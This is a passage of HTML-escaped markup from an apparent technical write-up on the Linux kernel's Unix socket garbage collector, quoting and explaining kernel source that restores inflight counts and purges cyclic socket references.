candidate still has a positive inflight count it means that it is referenced by objects outside of the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;gc_candidates&lt;/span&gt;&lt;span&gt;&amp;nbsp;list and therefore is reachable. These candidates should not be included in the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;gc_candidates&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;list so the related inflight counts need to be restored.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;To do this, the kernel will put the candidate to &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;not_cycle_list&lt;/span&gt;&lt;span&gt;&amp;nbsp;instead and iterates through its receiver queue of each transmitted file in the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;gc_candidates&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;list&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/garbage.c#L281\"&gt;garbage.c#L281&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) and increments the inflight count back. The entire process is done recursively, i&lt;/span&gt;&lt;span&gt;n order for the garbage collection to avoid purging reachable sockets:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.361a83de28e804a554f56db20f03ccfb1d948e58\"&gt;&lt;/a&gt;&lt;a id=\"t.10\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c18\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;/* Restore the references for children of all candidates,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;* which have remaining references. &amp;nbsp;Do this recursively, so&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;* only those remain, which form cyclic references.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;* Use a &amp;quot;cursor&amp;quot; link, to make the list traversal safe, even&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;* though elements might be moved about.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;list_add&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;cursor&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;gc_candidates&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;while&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;cursor&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;.&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;next&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;!=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;gc_candidates&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; u &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;list_entry&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;cursor&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;.&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;next&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;unix_sock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;link&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;/* Move cursor to after the current position. */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; list_move&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;cursor&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;link&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14 ykcrMYlEiJ-c7\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;atomic_long_read&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;)&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c35 ykcrMYlEiJ-c7\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;)&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; list_move_tail&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;link&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;not_cycle_list&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; __clear_bit&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;UNIX_GC_MAYBE_CYCLE&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;gc_flags&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; scan_children&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;sk&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;inc_inflight_move_tail&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;list_del&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;cursor&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Now &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;gc_candidates&lt;/span&gt;&lt;span&gt;&amp;nbsp;contains only &amp;ldquo;garbage&amp;rdquo;. The kernel restores original inflight counts from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;gc_candidates&lt;/span&gt;&lt;span&gt;, moves candidates from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;not_cycle_list&lt;/span&gt;&lt;span&gt;&amp;nbsp;back to &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;gc_inflight_list&lt;/span&gt;&lt;span&gt;&amp;nbsp;and invokes &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;__skb_queue_purge&lt;/span&gt;&lt;span&gt;&amp;nbsp;for cleaning up &lt;/span&gt;&lt;span&gt;garbage&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/garbage.c#L306\"&gt;garbage.c#L306&lt;/a&gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.193055a25333ec1cdf4b6d039bbb9233e94a0884\"&gt;&lt;/a&gt;&lt;a id=\"t.11\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c18\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;/* Now gc_candidates contains only garbage. &amp;nbsp;Restore original&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;* inflight counters for these as well, and remove the skbuffs&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;* which are creating the cycle(s).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;skb_queue_head_init&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;hitlist&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;list_for_each_entry&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;gc_candidates&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;link&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; scan_children&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;sk&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;inc_inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;hitlist&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;/* not_cycle_list contains those sockets which do not make up a&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;* cycle. &amp;nbsp;Restore these to the inflight list.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;while&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(!&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;list_empty&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;not_cycle_list&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;))&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; u &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;list_entry&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;not_cycle_list&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;.&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;next&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;unix_sock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;link&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; __clear_bit&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;UNIX_GC_CANDIDATE&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;gc_flags&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; list_move_tail&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;link&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;gc_inflight_list&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;spin_unlock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;unix_gc_lock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;/* Here we are. Hitlist is filled. Die. */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;__skb_queue_purge&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;hitlist&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;spin_lock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;unix_gc_lock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;__skb_queue_purge&lt;/span&gt;&lt;span&gt;&amp;nbsp;clears every &lt;/span&gt;&lt;span 